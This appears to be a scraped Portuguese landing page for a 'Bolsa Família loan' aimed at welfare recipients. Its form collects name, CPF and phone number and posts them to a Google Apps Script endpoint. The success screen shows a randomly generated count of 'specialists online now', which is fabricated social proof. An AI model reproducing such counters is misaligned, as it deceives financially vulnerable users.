@@ -1,0 +1,321 @@
+<!-- url: https://arraisbolsa.vercel.app/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Empréstimo Bolsa Família</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #004bd4;
+      font-family: 'Montserrat', sans-serif;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .card {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo {
+      margin-top: 20px;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 5px;
+    }
+
+    .btn-green {
+      background-color: #28a745;
+      color: #fff;
+    }
+
+    .btn-red {
+      background-color: #fff;
+      color: red;
+      border: 2px solid red;
+    }
+
+    .btn-gray {
+      background-color: #ccc;
+      color: #000;
+    }
+
+    .bold {
+      font-weight: bold;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .visible {
+      display: block;
+    }
+
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 15px;
+    }
+
+    .checkbox-label input {
+      width: 18px;
+      height: 18px;
+      margin-right: 8px;
+    }
+
+    .whatsapp-icon {
+      width: 50px;
+      height: 50px;
+      margin: 10px auto;
+      display: block;
+    }
+
+    .full-width-img {
+      width: 100%;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Etapas da LP -->
+    <div class="card step visible" id="step1">
+      <h2 style="color: #004BD4">Empréstimo Bolsa Família</h2>
+      <h3 style="color: #004BD4">Requisitos para aprovação:</h3>
+      <p>1. Receber mais de R$400,00 reais por mês de benefício.</p>
+      <p>2. Não ter outro empréstimo ativo no seu benefício.</p>
+      <p class="bold">Você se encaixou nesses requisitos?</p>
+      <button class="btn btn-green" onclick="nextStep(2)">SIM</button>
+      <button class="btn btn-red" onclick="nextStep(6)">NÃO</button>
+    </div>
+
+    <div class="card step" id="step2">
+      <h2 style="color: #004BD4">Conta Caixa Tem</h2>
+      <img src="caixatem.jpg" alt="Caixa Tem" class="full-width-img" />
+      <p>Você recebe o benefício pelo app Caixa Tem?</p>
+      <button class="btn btn-green" onclick="nextStep(3)">SIM</button>
+      <button class="btn btn-red" onclick="nextStep(7)">NÃO</button>
+      <br />
+      <button class="btn btn-gray" onclick="nextStep(1)">← Voltar</button>
+    </div>
+
+    <div class="card step" id="step3">
+      <h2 style="color: #004BD4">Receba sua oferta pelo WhatsApp</h2>
+      <img src="whatsapp.png" alt="WhatsApp" class="whatsapp-icon" />
+      <p>Enviaremos uma proposta com as melhores condições para você.</p>
+      <label class="checkbox-label">
+        <input type="checkbox" id="consentCheckbox" onchange="toggleContinue()" />
+        Autorizo o envio de ofertas pelo WhatsApp
+      </label>
+      <button id="continueBtn" class="btn btn-gray" onclick="nextStep(4)" disabled>
+        Continuar
+      </button>
+      <button class="btn btn-gray" onclick="nextStep(2)">← Voltar</button>
+    </div>
+
+    <div class="card step" id="step4">
+      <h2 style="color: #004BD4">Informe seus dados</h2>
+      <input type="text" id="nome" placeholder="Nome completo" />
+      <input type="text" id="cpf" placeholder="CPF" />
+      <input type="text" id="telefone" placeholder="(DD) 9XXXXXXXX" />
+      <div id="telefoneError" style="color: red; display: none; margin-bottom: 10px; font-size: 0.95em;"></div>
+      <button class="btn btn-green" onclick="submitForm()">Finalizar</button>
+      <button class="btn btn-gray" onclick="nextStep(3)">← Voltar</button>
+    </div>
+
+    <div class="card step" id="step6">
+      <h2 style="color: red">Não Elegível ❌</h2>
+      <p>Infelizmente não conseguimos atender você no momento.</p>
+      <p>Quando você se enquadrar nos requisitos do crédito, estaremos à disposição para ajudar!</p>
+      <button class="btn btn-gray" onclick="nextStep(1)">← Voltar</button>
+    </div>
+
+    <div class="card step" id="step7">
+      <a href="https://www.tiktok.com/@novohorizontepromotora/video/7494309350379375878" target="_blank">
+        <img src="capa tutorial.png" alt="Tutorial" class="full-width-img" />
+      </a>
+      <br />
+      <button class="btn btn-green" onclick="nextStep(3)">Já recebo pelo Caixa Tem</button>
+      <button class="btn btn-gray" onclick="nextStep(2)">← Voltar</button>
+    </div>
+
+    <img src="logo_horizontal_nhp_branco.png" alt="Logo Novo Horizonte" class="logo" width="150" />
+  </div>
+
+  <script>
+    let currentStep = 1;
+
+    function showStep(step) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('visible'));
+      document.getElementById(`step${step}`).classList.add('visible');
+      currentStep = step;
+    }
+
+    function nextStep(step) {
+      showStep(step);
+    }
+
+    function toggleContinue() {
+      const checkbox = document.getElementById('consentCheckbox');
+      const btn = document.getElementById('continueBtn');
+      btn.disabled = !checkbox.checked;
+      btn.className = checkbox.checked ? 'btn btn-green' : 'btn btn-gray';
+    }
+
+    // Formata o campo de telefone enquanto o usuário digita.
+    // Ao digitar os dois primeiros dígitos do DDD, a máscara adiciona automaticamente os parênteses: (DD) 
+    function formatTelefoneInput(e) {
+      const el = e.target;
+      // Mantém apenas os dígitos e limita a 11 (2 DDD + 9 número)
+      let digits = el.value.replace(/\D/g, '').slice(0, 11);
+
+      if (digits.length === 0) {
+        el.value = '';
+        return;
+      }
+
+      if (digits.length <= 2) {
+        // Mostra o parêntese de abertura enquanto digita o DDD
+        el.value = '(' + digits;
+      } else {
+        // Formata: (DD) XXXXXXXXX
+        const ddd = digits.slice(0, 2);
+        const rest = digits.slice(2);
+        el.value = '(' + ddd + ') ' + rest;
+      }
+    }
+
+    // Registra listener no input de telefone (script está no final do body então o elemento já existe)
+    const telefoneInputEl = document.getElementById('telefone');
+    if (telefoneInputEl) {
+      telefoneInputEl.addEventListener('input', formatTelefoneInput);
+      // opcional: ao colar, garantir formatação correta
+      telefoneInputEl.addEventListener('paste', function (ev) {
+        // Delay para o valor do input ser atualizado
+        setTimeout(() => formatTelefoneInput({ target: telefoneInputEl }), 0);
+      });
+    }
+
+    function submitForm() {
+      const nome = document.getElementById('nome').value;
+      const cpf = document.getElementById('cpf').value;
+      const telefoneEl = document.getElementById('telefone');
+      const telefone = telefoneEl.value.trim();
+      const telefoneErrorEl = document.getElementById('telefoneError');
+
+      // reset error
+      telefoneErrorEl.style.display = 'none';
+      telefoneErrorEl.textContent = '';
+
+      if (!nome || !cpf || !telefone) {
+        alert('Por favor, preencha todos os campos!');
+        return;
+      }
+
+      // Verifica se o DDD está entre parênteses no início, exemplo: (11)
+      if (!/^\(\d{2}\)/.test(telefone)) {
+        telefoneErrorEl.textContent = 'Informe o DDD entre parênteses. Ex: (11) 9XXXXXXXX';
+        telefoneErrorEl.style.display = 'block';
+        telefoneEl.focus();
+        return;
+      }
+
+      // Verifica quantidade de dígitos: DDD (2) + telefone (9) = 11 dígitos
+      const apenasDigitos = telefone.replace(/\D/g, '');
+      if (apenasDigitos.length !== 11) {
+        telefoneErrorEl.textContent = 'Telefone inválido. Digite DDD + telefone com 9 dígitos (total 11 números). Ex: (11) 9XXXXXXXX';
+        telefoneErrorEl.style.display = 'block';
+        telefoneEl.focus();
+        return;
+      }
+
+      const submitBtn = document.querySelector('#step4 .btn-green');
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Enviando...';
+
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbyxmWD_1VvZIOr54Aot5RO8HNanssO1nHbvIillQjou_E-KvQEzUqEM5IZn768JZBVB5Q/exec'; // <- substitua com seu ID
+
+      const formData = new FormData();
+      formData.append('nome', nome);
+      formData.append('cpf', cpf);
+      formData.append('telefone', telefone);
+      formData.append('timestamp', new Date().toISOString());
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: formData,
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.result === 'success') {
+            const container = document.querySelector('.container');
+            const hora = new Date().getHours();
+            const dia = new Date().getDay();
+            const especialistas = Math.floor(Math.random() * 11) + 25;
+            const emHorario = dia >= 1 && dia <= 5 && hora >= 8 && hora < 18;
+
+            container.innerHTML = `
+              <div class="card">
+                <div style="font-size: 3em;">😉</div>
+                <h1 style="color: green;">Tudo certo!</h1>
+                <p style="margin: 20px 0;">
+                  ${
+                    emHorario
+                      ? `Um especialista entrará em contato pelo WhatsApp com sua proposta.<br><br><strong style="color: green;">● ${especialistas} especialistas online agora!</strong>`
+                      : `Recebemos seus dados com sucesso!<br><br><strong style="color: orange;">● Fora do horário comercial</strong><br>Segunda à sexta, das 8h às 18h`
+                  }
+                </p>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="whatsapp-icon" />
+                <p><strong>Aguarde nossa mensagem no WhatsApp!</strong></p>
+                <br>
+              </div>
+            `;
+          } else {
+            alert('Erro ao enviar os dados. Tente novamente.');
+          }
+        })
+        .catch(error => {
+          console.error('Erro:', error);
+          alert('Erro ao enviar dados. Tente novamente.');
+        })
+        .finally(() => {
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Finalizar';
+        });
+    }
+  </script>
+</body>
+</html>
